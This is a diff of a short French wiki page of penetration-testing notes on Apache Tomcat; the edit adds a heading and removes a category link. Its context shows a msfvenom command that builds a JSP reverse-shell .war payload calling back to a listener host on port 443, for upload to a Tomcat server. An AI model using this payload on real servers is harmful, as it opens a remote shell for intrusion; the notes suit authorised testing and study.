@@ -3,6 +3,8 @@ title: Apache Tomcat
 permalink: /Apache_Tomcat/
 ---
 
+# Apache Tomcat
+
 Apache Tomcat est un serveur web permettant de déployer des applications Java.
 
 Exploitation
@@ -19,5 +21,3 @@ On peut ensuite uploader un reverse shell sous forme de .war:
 ``` bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.30.229 LPORT=443 -f war > shell.war
 ```
-
-[Category:Technologies](/Category:Technologies "wikilink")
